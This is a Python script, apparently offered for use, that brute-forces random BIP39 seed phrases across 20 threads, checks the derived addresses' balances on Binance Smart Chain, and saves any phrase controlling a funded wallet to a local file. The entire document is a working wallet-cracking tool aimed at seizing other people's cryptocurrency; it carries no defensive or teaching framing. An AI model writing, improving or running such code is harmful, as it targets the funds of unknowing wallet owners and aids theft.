import os
import itertools
import random
from web3 import Web3
from eth_account import Account
from mnemonic import Mnemonic
import threading

# Activate the Mnemonic feature of the eth_account library
Account.enable_unaudited_hdwallet_features()
print("Mnemonic feature has been activated.")

# Connect to the Binance Smart Chain
bsc = "https://bsc-dataseed.binance.org/"
web3 = Web3(Web3.HTTPProvider(bsc))
print("Connecting to Binance Smart Chain...")

# Ensure that we have successfully connected
assert web3.is_connected(), "Failed to connect to Binance Smart Chain"
print("Connected to Binance Smart Chain successfully.")

# Function to get wallet address from seed
def get_address_from_seed(seed):
    acct = Account.from_mnemonic(seed)
    return acct.address

# Function to check BNB balance and save to file if not zero
def check_balance_and_save(mnemonic, file_path):
    seed = Mnemonic("english").to_seed(mnemonic)
    address = get_address_from_seed(mnemonic)
    balance = web3.eth.get_balance(address)
    balance_bnb = web3.from_wei(balance, 'ether')
    if balance_bnb > 0:
        with open(file_path, 'a+') as file:
            file.write(f'Mnemonic: {mnemonic} - Address: {address} - Balance: {balance_bnb}\n')
            print(f"Saved mnemonic with balance: {balance_bnb} BNB to file.")
    else:
        print(f"Address {address} has a balance of 0 BNB.")

# Get absolute file path of mnemonic.txt in the same directory as the script
mnemonic_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'mnemonic.txt')

# Constants for the brute force
WORDLIST_SIZE = 2048  # Number of words in the BIP39 wordlist
MISSING_WORDS = 12    # Number of words to brute force

# Get the BIP39 English wordlist
mnemo = Mnemonic("english")
wordlist = mnemo.wordlist
print("Retrieved wordlist from BIP39.")

# Variable to count the number of valid mnemonics found
valid_mnemonics_count = 0

# Function to perform the brute force
def brute_force():
    global valid_mnemonics_count
    while True:
        # Generate a random mnemonic
        missing_words = random.sample(wordlist, MISSING_WORDS)
        mnemonic = " ".join(missing_words)

        # Check if the mnemonic is valid
        try:
            if mnemo.check(mnemonic):
                valid_mnemonics_count += 1
                print(f"Found a valid mnemonic ({valid_mnemonics_count} mnemonics): {mnemonic}")
                # Check balance and save to file if balance is not zero
                check_balance_and_save(mnemonic, mnemonic_file_path)
                
        except Exception as e:
            print(f"An error occurred: {e}")

# Create and start multiple threads for brute forcing
NUM_THREADS =20 # Number of threads to run concurrently
threads = []
for _ in range(NUM_THREADS):
    thread = threading.Thread(target=brute_force)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
print("Chương trình của bạn đã thực thi xong.")
input("Nhấn Enter để thoát...")
